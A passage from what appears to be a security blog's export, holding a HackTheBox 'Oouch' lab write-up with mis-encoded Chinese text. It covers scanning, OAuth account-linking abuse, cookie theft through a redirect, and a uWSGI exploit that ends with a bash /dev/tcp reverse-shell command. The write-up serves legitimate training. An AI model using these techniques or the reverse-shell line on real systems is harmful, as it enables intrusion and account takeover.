çš„è¿‡ç¨‹,æ¯æ¬¡æ¯”èµ›ç¡®å®éƒ½èƒ½æ¥è§¦åˆ°æ–°å§¿åŠ¿ä»¥åŠåæ€ä¸‹è‡ªå·±çš„ä¸è¶³ã€‚ç°åœ¨æ—¢ç„¶åˆ°æš‘å‡äº†ï¼Œæ˜¯æ—¶å€™å¥½å¥½ç³»ç»Ÿå­¦ä¹ ä¸‹æ–°çŸ¥è¯†ï¼š1.php: ä¸€ä¸ªæ˜¯phpauditlabsäº‰å–æ¯æ¬¡éƒ½å®¡ä¸€é;ç„¶ålaravelè·Ÿtpè¿™æ ·çš„æ¡†æ¶è¿‡ä¸€ä¸‹ã€‚å…¶å®wordpressä¹Ÿå¯ä»¥æ¥è§¦ä¸‹ï¼Œæ­£å¥½æœ€è¿‘ç¢°åˆ°äº†ã€‚2.hackthebox: ä¸ç”¨åšé‚£ä¹ˆæ€¥,ç°å½¹é¶æœºå‰©ä¸‹æ²¡åšçš„åŸºæœ¬ä¸Šéƒ½æ˜¯hardåŠä»¥ä¸Šéš¾åº¦äº†ã€‚å¯ä»¥æ…¢æ…¢æ¥ã€‚3.java: å‡ ä¹ä»é›¶å¼€å§‹çš„javaå­¦ä¹ (æˆ‘è‡ªå·±çˆ¬)4.python: djangoçš„è®¤è¯†å­¦ä¹ 5.Nodejs: ä¿æŒç°çŠ¶ã€‚å¤šç»ƒæ‰‹ä¸‹Nodejsçš„å¼€å‘ å·®ä¸å¤šå°±è¿™æ ·äº†ã€‚äº‰å–å‡æœŸæœŸé—´å¤šæ›´ä¸‹æ–‡ç« æ€»ç»“çŸ¥è¯†ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"hackthebox-Oouch","slug":"hackthebox-Oouch","date":"2020-07-01T05:43:43.000Z","updated":"2021-02-18T05:09:20.996Z","comments":true,"path":"2020/07/01/hackthebox-Oouch/","link":"","permalink":"https://www.bycsec.top/2020/07/01/hackthebox-Oouch/","excerpt":"Oouché¶æœºçš„éš¾åº¦ç›¸æ¯”æœ€è¿‘åšå®Œçš„ä¸¤ä¸ªhard machine Quickè·ŸForwardslashè€Œè¨€æœ‰è¿‡ä¹‹è€Œæ— ä¸åŠã€‚ç”šè‡³äºæ„Ÿè§‰å¯èƒ½æ¥è¿‘åˆ°Insaneéš¾åº¦äº†ã€‚ä»webç•Œé¢ä¸‹æ‰‹æ—¶é‡åˆ°å¾ˆå¤šä¸ç¨³å®šçš„é—®é¢˜ï¼Œè€Œä¹‹åä»userææƒåˆ°rootæ›´æ˜¯å‡ºç°ç„å­¦é—®é¢˜ï¼Œä¸€æ¨¡ä¸€æ ·çš„çš„payloadå¤´ä¸€å¤©å¤±è´¥ç¬¬äºŒå¤©å°±æˆäº†ã€‚ä½†æ˜¯æ€»å½’å­¦åˆ°äº†ä¸å°‘æ–°çŸ¥è¯†ï¼Œæ‰€ä»¥èµ¶ç´§æ€»ç»“ä¸‹ã€‚","text":"Oouché¶æœºçš„éš¾åº¦ç›¸æ¯”æœ€è¿‘åšå®Œçš„ä¸¤ä¸ªhard machine Quickè·ŸForwardslashè€Œè¨€æœ‰è¿‡ä¹‹è€Œæ— ä¸åŠã€‚ç”šè‡³äºæ„Ÿè§‰å¯èƒ½æ¥è¿‘åˆ°Insaneéš¾åº¦äº†ã€‚ä»webç•Œé¢ä¸‹æ‰‹æ—¶é‡åˆ°å¾ˆå¤šä¸ç¨³å®šçš„é—®é¢˜ï¼Œè€Œä¹‹åä»userææƒåˆ°rootæ›´æ˜¯å‡ºç°ç„å­¦é—®é¢˜ï¼Œä¸€æ¨¡ä¸€æ ·çš„çš„payloadå¤´ä¸€å¤©å¤±è´¥ç¬¬äºŒå¤©å°±æˆäº†ã€‚ä½†æ˜¯æ€»å½’å­¦åˆ°äº†ä¸å°‘æ–°çŸ¥è¯†ï¼Œæ‰€ä»¥èµ¶ç´§æ€»ç»“ä¸‹ã€‚ é¶æœºip: 10.10.10.186 æ”»å‡»æœº: 10.10.14.40 initial foothold to user nmap 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# Nmap 7.80 scan initiated Sun Jun 28 15:53:13 2020 as: nmap -sC -sV -oA nmap/oouch 10.10.10.177WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second valueNmap scan report for 10.10.10.177Host is up (0.43s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 ftp ftp 49 Feb 11 19:34 project.txt| ftp-syst: | STAT: | FTP server status:| Connected to 10.10.14.46| Logged in as ftp| TYPE: ASCII| Session bandwidth limit in byte/s is 30000| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)|_ 256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)5000/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2| http-title: Welcome to Oouch|_Requested resource was http://10.10.10.177:5000/login?next=%2F8000/tcp open rtsp| fingerprint-strings: | FourOhFourRequest, GetRequest, HTTPOptions: | HTTP/1.0 400 Bad Request| Content-Type: text/html| Vary: Authorization| &lt;h1&gt;Bad Request (400)&lt;/h1&gt;| RTSPRequest: | RTSP/1.0 400 Bad Request| Content-Type: text/html| Vary: Authorization| &lt;h1&gt;Bad Request (400)&lt;/h1&gt;| SIPOptions: | SIP/2.0 400 Bad Request| Content-Type: text/html| Vary: Authorization|_ &lt;h1&gt;Bad Request (400)&lt;/h1&gt;|_http-title: Site doesn't have a title (text/html).|_rtsp-methods: ERROR: Script execution failed (use -d to debug)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8000-TCP:V=7.80%I=7%D=6/28%Time=5EF84CE8%P=x86_64-pc-linux-gnu%r(GeSF:tRequest,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20texSF:t/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(400\\)&lt;/SF:h1&gt;\")%r(FourOhFourRequest,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nConSF:tent-Type:\\x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\n&lt;h1&gt;Bad\\x20ReqSF:uest\\x20\\(400\\)&lt;/h1&gt;\")%r(HTTPOptions,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x20ReqSF:uest\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\n&lt;h1SF:&gt;Bad\\x20Request\\x20\\(400\\)&lt;/h1&gt;\")%r(RTSPRequest,64,\"RTSP/1\\.0\\x20400\\x2SF:0Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20AuthorizationSF:\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(400\\)&lt;/h1&gt;\")%r(SIPOptions,63,\"SIP/2\\.0\\SF:x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20AuthSF:orization\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(400\\)&lt;/h1&gt;\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Jun 28 15:55:59 2020 -- 1 IP address (1 host up) scanned in 166.01 seconds 21,22,5000,8000 ç«¯å£å¼€æ”¾ã€‚å¹¶ä¸”21ç«¯å£ftpå¯ä»¥åŒ¿åç™»å½•ã€‚ ftp annoymous login ftpåŒ¿åç™»å½•æä¸‹æ¥ä¸€ä¸ªproject.txtget file project.txt 12Flask -&gt; ConsumerDjango -&gt; Authorization Server æŒ‰ç…§nmapçš„ç»“æœï¼Œ5000è·Ÿ8000æœ‰ä¸¤ä¸ªwebæœåŠ¡ï¼Œçœ‹èµ·æ¥ä¼¼ä¹æ˜¯flaskè·Ÿdjango. enumeration æ­¤æ—¶ä»5000ç«¯å£çš„æœåŠ¡å…¥æ‰‹ã€‚é¦–å…ˆæ³¨å†Œç™»å½•åå‘ç°æä¾›äº†å‡ ä¸ªæ¯”è¾ƒæ²¡ç”¨çš„åŠŸèƒ½ï¼Œå…¶ä¸­/documentè·¯ç”±çš„å†…å®¹æç¤ºåªæœ‰adminèƒ½ç”¨ã€‚/profileæ˜¾ç¤ºæˆ‘ä»¬å¯ä»¥é“¾æ¥è´¦æˆ·ï¼Œä½†æ˜¯ä¸çŸ¥é“è¦æ€ä¹ˆåšã€‚/contactå¤„ä¼¼ä¹å¯ä»¥è®©adminæ¥å—æˆ‘ä»¬çš„urlç„¶åé€ æˆssrf.ä½†æ˜¯è¿™äº›éƒ½è¿˜æ²¡æœ‰å¯å…·ä½“ä¸‹æ‰‹çš„åœ°æ–¹ã€‚ è€Œ8000ç«¯å£çš„æœåŠ¡ç›´æ¥è®¿é—®è¿”å›400.ä¼¼ä¹åˆ°è¿™ä¸€æ­¥å°±å¡ä½äº†ã€‚ äºæ˜¯å°è¯•çˆ†ç ´è·¯ç”±ï¼Œæœ‰äº†æ„å¤–çš„æ”¶è·ã€‚ 1wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u 'http://10.10.10.177:5000/FUZZ' --hc 404 -t 70 123456789101112131415161718192021********************************************************* Wfuzz 2.4.5 - The Web Fuzzer *********************************************************Target: http://10.10.10.177:5000/FUZZTotal requests: 4614===================================================================ID Response Lines Word Chars Payload ===================================================================000000223: 302 3 L 24 W 247 Ch \"about\"000000001: 302 3 L 24 W 237 Ch \"\" 000001013: 302 3 L 24 W 251 Ch \"contact\" 000001325: 302 3 L 24 W 255 Ch \"documents\" 000001908: 302 3 L 24 W 245 Ch \"home\" 000002347: 200 54 L 110 W 1828 Ch \"login\" 000002362: 302 3 L 24 W 219 Ch \"logout\" 000002722: 302 3 L 24 W 247 Ch \"oauth\" 000003160: 302 3 L 24 W 251 Ch \"profile\" 000003341: 200 63 L 124 W 2109 Ch \"register\" é™¤äº†ä¹‹å‰å‡ ä¸ªåŠŸèƒ½å¤–è¿˜æœ‰oauthã€‚(è¿™é‡Œæ˜¯æ¢äº†ä¸ªå¹³æ—¶ä¸ç”¨çš„dirbè¯å…¸çˆ†å‡ºæ¥çš„ï¼Œè™½ç„¶å†…å®¹å°‘ä½†æœ‰æ—¶æ°å¥½å°±èƒ½å¾—åˆ°æƒ³è¦çš„ä¿¡æ¯) è®¿é—®oauth å¾—åˆ°äº†5000ç«¯å£ä¸8000ç«¯å£çš„å…·ä½“åŸŸåã€‚äºæ˜¯åŠ åˆ°/etc/hostsä¸­ã€‚ å†æ¥ç€å°è¯•äº†ä¸¤ä¸ªé“¾æ¥å,æˆ‘å‘ç°å¤§æ¦‚å®ç°äº†ä¸€ä¸ªauthorizeçš„è¿‡ç¨‹ã€‚åŠ ä¸Šoauthçš„è¿™ä¸ªåè¯ï¼Œæˆ‘å†³å®šå…ˆå»googleä¸€ä¸‹ï¼Œäºæ˜¯å¤§è‡´èƒ½å¤Ÿç†è§£ï¼Œè¿™æ˜¯ä¸€ä¸ªå®ç°äº†oauth2åŠŸèƒ½çš„åœºæ™¯ã€‚ oauthçš„æµç¨‹æ˜¯è¿™æ ·çš„ 1.The application requests authorization to access service resources from the user. The application needs to provide the client ID, client secret, redirect URI and the required scopes.2.If the user authorizes the request, the application receives an authorization grant3.The application ** requests an access token from the authorization server ** by presenting authentication of its own identity, and the authorization grant4.If the application identity is authenticated and the authorization grant is valid, the authorization server issues the access and refresh (if required) token to the application. Authorization is complete.5.The application requests the resource from the resource server and presents the access token for authentication6.If the access token is valid, the resource server serves the resource to the application æŒ‰ç…§é˜®ä¸€å³°è€å¸ˆçš„ç†è§£ï¼Œå°±æ˜¯åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡å•†ä¹‹é—´åŠ ä¸Šäº†ä¸€ä¸ªæˆæƒå±‚ï¼Œè¿™é‡Œå…·ä½“è€Œè¨€ï¼Œå°±æ˜¯æˆ‘ä»¬åœ¨æˆæƒåï¼Œå¯ä»¥è®©8000ç«¯å£çš„è´¦å·è·Ÿ5000çš„è´¦å·ç»‘å®šåœ¨ä¸€èµ·ã€‚æ¯æ¬¡è¿›è¡Œæ“ä½œæ—¶éƒ½ä¼šæœ‰è¿™æ ·çš„ä¸­é—´é¡µé¢ æ ¹æ®consumeré‡Œoauthçš„è¦æ±‚ã€‚æˆ‘ä»¬åº”è¯¥å…ˆå»oauth/connect,ç„¶åå½“æˆ‘ä»¬åœ¨authorizationé‡Œæ³¨å†Œå®Œè´¦å·åï¼Œè®¿é—®oauth/loginå°±å®Œæˆäº†è´¦å·çš„å…³è”ã€‚ è€Œè¿™é‡Œå°±äº§ç”Ÿäº†ä¸€ä¸ªæå‡æƒé™çš„å¯èƒ½ã€‚oauthçš„ç‰¹ç‚¹åœ¨äºï¼Œæˆ‘ä»¬è®¿é—®oauth/loginè¿›è¡Œè´¦å·å…³è”æ—¶ï¼Œä¸­é—´å±‚æ˜¯æ ¹æ®æˆ‘ä»¬ä¹‹å‰connectæ—¶ä¼ è¾“çš„tokenè¿›è¡Œç›®æ ‡åˆ¤å®šçš„(å…·ä½“æŠ“åŒ…äº†è§£)ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä»¥adminçš„èº«ä»½ä¼ ä¸€ä¸ªæœ‰æ•ˆtokenï¼Œä¹‹åè¿æ¥è´¦å·æ—¶å°±ä¼šæŠŠæˆ‘ä»¬åœ¨authorizationçš„è´¦å·ä¸consumerå¤„adminçš„è´¦å·ç›¸å…³è”ã€‚è¿™æ˜¯æ¯ä¸€æ¬¡è¿›è¡Œconnectæ—¶,æˆ‘ä»¬å®¢æˆ·ç«¯ä¼šå‘å‘çš„ä¸€ä¸ªå«æœ‰tokençš„åŒ… è¿™æ—¶ä¹‹å‰æåˆ°çš„/contactå°±æ´¾ä¸Šç”¨åœºäº†ã€‚æˆ‘ä»¬burpæŠ“åŒ…å¹¶æŠŠè¿™ä¸ªä¼ è¾“tokençš„åŒ…dropæ‰ã€‚è½¬è€Œåˆ©ç”¨adminçš„contactå®Œæˆè¿™æ¬¡tokenå‘é€ã€‚æ¥ä¸‹æ¥å†æ¬¡ç‚¹å‡»oauth/loginï¼Œå°±èƒ½è§¦å‘è¿æ¥,ç»‘å®šadminè´¦æˆ·ã€‚ ç°åœ¨æˆ‘ä»¬å·²ç»ç»‘å®šqtcè´¦æˆ·äº†ã€‚å¹¶ä¸”åœ¨documentå¤„å‘ç°æç¤º ä¸€ä¸ªè´¦å·ã€‚åŠŸèƒ½æ˜¯application register ä¸€ä¸ªè·¯ç”± /api/get_user å¦å¤–/oauth/authorize æ”¯æŒgetè¯·æ±‚ ä¼¼ä¹å¯ä»¥æœ‰é€”å¾„å¯ä»¥å¾—åˆ°sshkey çœ‹æ¥æ¥ä¸‹æ¥è¦è½¬æˆ˜8000ç«¯å£çš„authorization.oouch.htbäº†ã€‚é¦–å…ˆä½œä¸ºæ™®é€šç”¨æˆ·ï¼Œ8000ç«¯å£é»˜è®¤çš„ä¸¤ä¸ªè·¯ç”±éƒ½æ²¡æœ‰åŠæ³•ä½¿ç”¨ã€‚é‚£ä¹ˆç°åœ¨å…ˆæƒ³åŠæ³•ç”¨ä¸Šæˆ‘ä»¬ä¹‹å‰å¾—åˆ°çš„ç”¨æˆ·å¯†ç ã€‚ æ¥ç€çˆ†ç ´ 12wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;FUZZ --hc 404 -t 80wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;FUZZ --hc 404 -t 80 ç¬¬ä¸€ä¸ªæ— æœã€‚ç¬¬äºŒä¸ªå‘ç°å­˜åœ¨/applicationä¹Ÿå°±æ˜¯å¯ä»¥è®¿é—®/oauth/applicationç„¶è€Œéœ€è¦ç”¨æˆ·å¯†ç ã€‚æˆ‘ä»¬ä¹‹å‰çš„è´¦æˆ·å¯†ç ä¹Ÿä¸è¡Œã€‚è¿™æ—¶ä»”ç»†è¿‡ä¸€édocument.å‘ç°è¯´è¿™ä¸ªè´¦æˆ·å¯†ç æ˜¯æœ‰æ³¨å†ŒåŠŸèƒ½çš„ï¼Œé‚£å°±è¯•è¯•/oauth/application/registerå¹¶è¾“å…¥è´¦æˆ·å¯†ç  æˆåŠŸäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±æœ‰äº†å¦ä¸€ä¸ªæœ‰æ•ˆçš„authorization appäº†ã€‚æˆ‘è®¾ç½®çš„ä¿¡æ¯å¦‚ä¸‹ 1234567http://authorization.oouch.htb:8000/oauth/applications/2/clientid cHYVFErrrGQAm6Q1iWEfgT0hgf2KX4SIecLnNCKgclientsecret 1QWQrnwCzUIiU8tB4BywB3p9Ca8umJGaSzoxJraanOwv7duBX3UnZN4n1VYMzLOrnrXh7OzLNhHF7qPv1UufuY8fIkNLDoPDSaUC2JGqKVeKb9oJZJweVHeFCgku6kqzClient type publicAuthorization Grant Type client-credentialsredirect uri http://10.10.14.46/ æ ¹æ®ä¹‹å‰çš„ssrfï¼Œæˆ‘ä»¬ä¼¼ä¹æœ‰åŠæ³•èƒ½å¤Ÿé€šè¿‡æœ€åçš„ä¸€ä¸ªuriå®Œæˆxssçš„æ”»å‡»ã€‚ä¹Ÿå°±æ˜¯æ‰“åˆ°adminçš„cookieã€‚é‚£ä¹ˆå¦‚ä½•åˆæ³•çš„æ„é€ ä¸€ä¸ªurlä½¿å¾—ç›´æ¥getè®¿é—®å°±èƒ½é‡å®šå‘å‘¢ï¼Ÿè¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€äº›oauthçš„çŸ¥è¯†oauth-authorize 123456789101112131415161718#facebookGET https:&#x2F;&#x2F;api.instagram.com&#x2F;oauth&#x2F;authorize ?client_id&#x3D;&#123;app-id&#125;, &amp;redirect_uri&#x3D;&#123;redirect-uri&#125;, &amp;response_type&#x3D;code, &amp;scope&#x3D;&#123;scope&#125;#twitterPOST &#x2F;oauth2&#x2F;token HTTP&#x2F;1.1Host: api.twitter.comUser-Agent: My Twitter App v1.0.23Authorization: Basic eHZ6MWV2R ... o4OERSZHlPZw&#x3D;&#x3D;Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8Content-Length: 29Accept-Encoding: gzipgrant_type&#x3D;client_credentials ä¸Šé¢ä¸¤ä¸ªåˆ†åˆ«æ˜¯facebookè·Ÿtwitterçš„oauthapiçš„å¼€å‘è€…æ–‡æ¡£é‡Œæ‰¾çš„ä¾‹å­ã€‚è™½ç„¶å„å®¶éƒ½æœ‰ä¸åŒï¼Œä½†æ˜¯å¤§æ¦‚çš„é‚£å‡ ä¸ªå‚æ•°ä¹Ÿæ˜¯èƒ½ç†è§£çš„ã€‚åŠ ä¸Šä¹‹å‰documenté‡Œè¯´oauth/authorizeæ”¯æŒgetè¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å¯ä»¥æŒ‰ç…§è‡ªå·±çš„appåŠŸèƒ½ï¼Œæ„é€ ä¸€ä¸ªæ¶æ„çš„urlï¼Œé‡å®šå‘åˆ°æˆ‘ä»¬è‡ªå·±è¿™ã€‚å…ˆåƒself-xssä¸€æ ·å¾€è‡ªå·±è¿™æ‰“ä¸€å‘urlçš„å„ä¸ªå‚æ•°éƒ½è¦ä¸ä¹‹å‰æ³¨å†Œçš„appçš„å€¼å®Œå…¨ä¸€è‡´ã€‚å…¶ä¸­response_typeä¸ºcodeæ˜¯oauthæ ‡å‡†å›ºå®šçš„ã€‚ 1http:&#x2F;&#x2F;authorization.oouch.htb:8000&#x2F;oauth&#x2F;authorize&#x2F;?client_id&#x3D;cHYVFErrrGQAm6Q1iWEfgT0hgf2KX4SIecLnNCKg&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;10.10.14.46&#x2F;&amp;response_type&#x3D;code&amp;grant_type&#x3D;anthorization_code&amp;client_secret&#x3D;1QWQrnwCzUIiU8tB4BywB3p9Ca8umJGaSzoxJraanOwv7duBX3UnZN4n1VYMzLOrnrXh7OzLNhHF7qPv1UufuY8fIkNLDoPDSaUC2JGqKVeKb9oJZJweVHeFCgku6kqz ç›´æ¥æµè§ˆå™¨è®¿é—®è¿™ä¸ªurl,ä¼šè¿›å…¥åˆ°authorizeçš„ä¸­é—´å±‚ã€‚ç‚¹ä¸‹authorizeå°±èƒ½åœ¨æœ¬æœºæ”¶åˆ°è¯·æ±‚ é‚£ä¹ˆç›´æ¥åˆ©ç”¨ä¹‹å‰çš„contactå¤„ssrfå³å¯å®Œæˆcookieçš„ç›—å–ã€‚ è¿™é‡Œæ¯”è¾ƒç‹—çš„æ˜¯å¿…é¡»å»æ‰response_typeè¿™ä¸ªè¯·æ±‚å‚æ•°ï¼Œæ‰èƒ½å®Œæˆé‡å®šå‘ã€‚åŸç†å…¶å®ä¸Šé¢è§£é‡Šè¿‡äº†ï¼Œå› ä¸ºä¸€ä¸ªæœ‰æ•ˆçš„è¯·æ±‚å¿…é¡»ç»è¿‡æ‰‹åŠ¨çš„authorizationç¡®è®¤æ‰èƒ½å®Œæˆé‡å®šå‘ã€‚å¦‚æœæ˜¯ä¸€ä¸ªä¸æœ‰æ•ˆçš„urlåˆ™ä¼šåœ¨æˆæƒä¹‹å‰å°±é‡å®šå‘ã€‚åŸºäºæ­¤å¤„åªèƒ½å‘ä¸€ä¸ªè¯·æ±‚ã€‚æˆ‘ä»¬åªèƒ½é€šè¿‡ä¸€ä¸ªæ— æ•ˆresponse_typeå®Œæˆé‡å®šå‘ã€‚ å¾—åˆ°cookieåæ›´æ¢ã€‚æ¥ä¸‹æ¥å°è¯•è®¿é—®oauth/token https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/ä¸Šé¢æ˜¯oauthå®˜æ–¹æ–‡æ¡£çš„ï¼Œé€šè¿‡oauth/tokenè·å–ä¸€ä¸ªaccess_tokenå†…å®¹ã€‚æˆ‘ä»¬å‚ç…§æ ¼å¼å‘åŒ…å³å¯(æ³¨æ„è¿™é‡Œgrant_typeçš„å€¼ä¸æˆ‘ä»¬åˆå§‹çš„appä¸ä¸€æ ·ã€‚æ‰€ä»¥è¦ç”¨ä¹‹å‰çš„è´¦æˆ·æ›´æ”¹è¿™ä¸€é€‰é¡¹) æ¥ä¸‹æ¥ç”¨å¾—åˆ°çš„access_token è®¿é—®å”¯ä¸€æ²¡ç”¨ä¸Šçš„/api/get_user?access_token=xxxx.å‘ç°è¿”å›userçš„jsonä¿¡æ¯ã€‚ç„¶åå°±å¡ä½äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚è¿™æ—¶æƒ³èµ·æ¥å‰é¢è¿˜æç¤ºè¯´æœ‰è·å–sshkeyçš„æ–¹æ³•ã€‚äºæ˜¯æŠŠuseræ¢æˆssh æ‹¿åˆ°keyåç»ˆäºå¯ä»¥ç™»é™†è¿™å°é¶æœºæ‹¿åˆ°user.txtäº†ã€‚ å°ç»“ä¸‹ã€‚ç¬¬ä¸€éƒ¨åˆ†ææ€•éš¾åº¦æ¯”å¸¸è§„çš„htbwebéƒ¨åˆ†è¦éš¾çš„å¤šã€‚å› ä¸ºæ¶‰åŠäº†å¤§é‡æ–°çŸ¥è¯†ä»¥åŠæƒé™é—®é¢˜ï¼ŒåŒæ—¶ç½‘ç«™ä¸çŸ¥é“ä¸ºä»€ä¹ˆç»å¸¸500ã€‚ä¸è¿‡oauthçš„å­˜åœ¨ä¹Ÿè®©æˆ‘é‡æ–°ä½“ä¼šåˆ°äº†è¶Šæƒçš„è®¸å¤šæ–°å¯èƒ½ã€‚æœ€åçš„sshæ€»è§‰å¾—æœ‰ç‚¹è„‘æ´äº†ã€‚ privesc to rootsshç™»å½•åå…ˆçœ‹åˆ°ç›®å½•ä¸‹æœ‰ä¸ªæç¤º.note.txt 1Implementing an IPS using DBus and iptables &#x3D;&#x3D; Genius? Dbusä¼¼ä¹æ˜¯çªç ´å£ã€‚ä½†æ˜¯æˆ‘çš„äº†è§£ä»…é™äºçŸ¥é“Dbusæ˜¯å·¥æ§é‡Œç»å¸¸å‡ºç°çš„åè®®ã€‚ç„¶ålinpeas.shæ‰«ä¸€éã€‚å‘ç°æ²¡æœ‰ä»€ä¹ˆæœ‰æ„æ€çš„æ–‡ä»¶ã€‚å› ä¸ºä¸¤ä¸ªpythonæœåŠ¡éƒ½æ˜¯ç”¨dockerè·‘çš„ã€‚åŒæ—¶www-dataè·‘ç€uwsgi. è¿™é‡Œé¦–å…ˆé—®é¢˜æ˜¯æˆ‘ä»¬ä½œä¸ºérootç”¨æˆ·å¦‚ä½•è¿›å…¥dockerã€‚ä¸ç„¶æœ‰æ•ˆä¿¡æ¯å®åœ¨å¤ªå°‘äº†ã€‚è¯•äº†å¾ˆä¹…å‘ç°å¯ä»¥ç›´æ¥ç”¨sshç™»å½•è¿›docker??? å½“ç„¶ã€‚åªæœ‰Flaskçš„dockeræ˜¯å¯ä»¥ç”¨sshç™»å½•çš„ã€‚ç™»å½•è¿›å»åå…ˆçœ‹æ–‡ä»¶æºç ã€‚åœ¨å…¶ä¸­ä¸€ä¸ªæ‰¾åˆ° é‡Œé¢æåˆ°äº†Dbusçš„interfaceä¹Ÿå°±æ˜¯æ¥å£ã€‚åç§°å«åšhtb.oouch.Blcokã€‚å¹¶ä¸”åé¢è°ƒç”¨äº†Blockæ–¹æ³•ã€‚ å¦ä¸€è¾¹åœ¨oouchæœ¬æœºä¸Šæ‰¾dbusç›¸å…³é…ç½®ã€‚åœ¨/etc/dbus-1/system.då‘ç°configæ–‡ä»¶ 123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!-- -*- XML -*- --&gt;&lt;!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\" \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"&gt;&lt;busconfig&gt; &lt;policy user=\"root\"&gt; &lt;allow own=\"htb.oouch.Block\"/&gt; &lt;/policy&gt; &lt;policy user=\"www-data\"&gt; &lt;allow send_destination=\"htb.oouch.Block\"/&gt; &lt;allow receive_sender=\"htb.oouch.Block\"/&gt; &lt;/policy&gt;&lt;/busconfig&gt; ä¹Ÿå°±æ˜¯è¯´ï¼Œrootç¡®å®æ˜¯å¯ä»¥åˆ©ç”¨dbusè¿›è¡Œé€šä¿¡çš„ã€‚ä½†åªæœ‰www-dataå¯ä»¥è¿›è¡Œæ”¶å‘æ¶ˆæ¯é€šä¿¡ã€‚é‚£ä¹ˆä¸‹é¢çš„è¦åŠ¡æ˜¯è·å–www-dataçš„æƒé™ã€‚ è¿™é‡Œå…¶å®å¹¶ä¸éš¾ã€‚å› ä¸ºæˆ‘ä»¬ä¹‹å‰å·²ç»å‘ç°è¿‡ï¼Œwww-dataæ˜¯è·‘ç€uwsgiçš„ã€‚è€Œpythonçš„uwsgiå¯ä»¥è§¦å‘RCEä¼¼ä¹åœ¨å‡ å¹´å‰çš„RWCTFä¸­å°±å‡ºç°è¿‡ã€‚(è¿™æ˜¯çœ‹CTF is awesome ä¸­å¬åˆ°youtuberæåˆ°çš„) æ‰€ä»¥ä¸»è¦å°±éº»çƒ¦åœ¨æŠŠexpä¼ è¿‡å»ã€‚è¿™é‡Œä½¿ç”¨scpæ¯”è¾ƒæ–¹ä¾¿ã€‚å› ä¸ºdockerå®¹å™¨é‡Œå•¥éƒ½æ²¡æœ‰.æ£€æŸ¥ä¸‹socketæ–‡ä»¶ä½ç½®ï¼Œäºæ˜¯åœ¨dockerçš„webæºç å¤„æ‰¾åˆ°uwsgi.iniæ–‡ä»¶ 1234567891011qtc@aeb4525789d8:/code$ cat uwsgi.ini [uwsgi]module = oouch:appuid = www-datagid = www-datamaster = trueprocesses = 10socket = /tmp/uwsgi.socketchmod-sock = 777vacuum = truedie-on-term = true https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.pyuwsgiçš„è„šæœ¬ä¼ å¥½è¿è¡Œè„šæœ¬ï¼Œæ¥ä¸‹æ¥qtcå¤„ncæ¥å—å³å¯ 1python rce.py -m unix -u &#x2F;tmp&#x2F;uwsgi.socket -c &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.18.0.1&#x2F;9001 0&gt;&amp;1&#39;&quot; è¿™é‡Œä¼¼ä¹è„šæœ¬æœ‰ä¸ªå°é—®é¢˜ï¼Œä¸è¿‡æŠŠæŠ¥é”™çš„ä½ç½®æ”¹ä¸‹å°±å¥½ã€‚ 